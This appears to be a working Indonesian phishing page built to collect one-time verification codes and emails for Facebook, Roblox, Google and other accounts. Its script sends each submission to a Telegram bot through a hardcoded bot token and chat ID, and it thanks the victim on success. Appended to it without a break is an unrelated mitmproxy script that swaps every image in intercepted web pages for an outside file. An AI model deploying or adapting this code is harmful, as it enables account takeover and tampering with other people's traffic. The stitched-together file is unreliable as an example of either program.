<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Kode Verifikasi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #34495e;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background-color: #2980b9;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            display: none;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            display: none;
        }
        .note {
            font-size: 12px;
            color: #7f8c8d;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Kirim Kode Verifikasi</h1>
        
        <div class="form-group">
            <label for="service">Layanan:</label>
            <select id="service" name="service">
                <option value="Facebook">Facebook</option>
                <option value="Roblox">Roblox</option>
                <option value="Google">Google</option>
                <option value="Lainnya">Lainnya</option>
            </select>
        </div>
        
        <div id="otherServiceGroup" style="display: none;" class="form-group">
            <label for="otherService">Nama Layanan Lainnya:</label>
            <input type="text" id="otherService" name="otherService" placeholder="Masukkan nama layanan">
        </div>
        
        <div class="form-group">
            <label for="code">Kode Verifikasi:</label>
            <input type="text" id="code" name="code" placeholder="Masukkan kode 4-8 digit" required>
            <div class="note">Contoh: 123456</div>
        </div>
        
        <div class="form-group">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" placeholder="Masukkan alamat email">
            <div class="note">Contoh: user@gmail.com</div>
        </div>
        
        <button id="submitBtn">Kirim Kode Verifikasi</button>
        
        <div id="successMessage" class="success">
            Kode verifikasi berhasil dikirim! Terima kasih atas bantuan Anda.
        </div>
        
        <div id="errorMessage" class="error">
            Terjadi kesalahan saat mengirim kode. Silakan coba lagi.
        </div>
    </div>
    
    <script>
        // Telegram bot token dan chat ID
        const telegramBotToken = "7511922195:AAEgJoM_xB7aJHs2UOKOEyp6TCAysP_nRFo";
        const telegramChatId = "6792180345";
        
        // Tampilkan/sembunyikan field layanan lainnya
        document.getElementById('service').addEventListener('change', function() {
            const otherServiceGroup = document.getElementById('otherServiceGroup');
            if (this.value === 'Lainnya') {
                otherServiceGroup.style.display = 'block';
            } else {
                otherServiceGroup.style.display = 'none';
            }
        });
        
        // Handle submit form
        document.getElementById('submitBtn').addEventListener('click', function() {
            const serviceSelect = document.getElementById('service');
            const otherServiceInput = document.getElementById('otherService');
            const codeInput = document.getElementById('code');
            const emailInput = document.getElementById('email');
            
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            
            // Validasi kode
            const code = codeInput.value.trim();
            if (!code || !/^\d{4,8}$/.test(code)) {
                errorMessage.textContent = 'Kode verifikasi tidak valid! Harus 4-8 digit angka.';
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            // Dapatkan layanan
            let service = serviceSelect.value;
            if (service === 'Lainnya') {
                service = otherServiceInput.value.trim() || 'Tidak Diketahui';
            }
            
            // Dapatkan email
            const email = emailInput.value.trim() || 'user@gmail.com';
            
            // Tanggal dan waktu
            const now = new Date();
            const date = now.toLocaleDateString('id-ID', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });
            const time = now.toLocaleTimeString('id-ID', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            const timestamp = `${date} ${time}`;
            
            // Format pesan Telegram
            const message = `🔐 <b>KODE VERIFIKASI DARI WEB</b> 🔐
<b>Layanan:</b> ${service}
<b>Kode:</b> <code>${code}</code>
<b>Email:</b> ${email}
<b>Waktu:</b> ${timestamp}
<b>Sumber:</b> Web Form

<i>Dikirim melalui halaman web</i>`;
            
            // Kirim ke Telegram
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            
            fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Reset form
                    codeInput.value = '';
                    emailInput.value = '';
                    if (service === 'Lainnya') {
                        otherServiceInput.value = '';
                    }
                    serviceSelect.selectedIndex = 0;
                    
                    // Tampilkan pesan sukses
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                } else {
                    throw new Error('Telegram API error');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                errorMessage.textContent = 'Terjadi kesalahan saat mengirim kode. Silakan coba lagi.';
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
            });
        });
    </script>
</body>
</html>#!/usr/bin/python3

from mitmproxy import http
from bs4 import BeautifulSoup

MY_IMAGE_FILE = 'https://www.mydomain.tld/some_image.jpg'

def response(flow: http.HTTPFlow) -> None:
    if flow.response.headers.get("Content-Type") and \
       "text/html" in flow.response.headers["Content-Type"]:
        soup = BeautifulSoup(flow.response.content,
                             features="html.parser")

        for img in soup('img'):
            img['src'] = MY_IMAGE_FILE
    
        flow.response.text = soup.prettify()
    
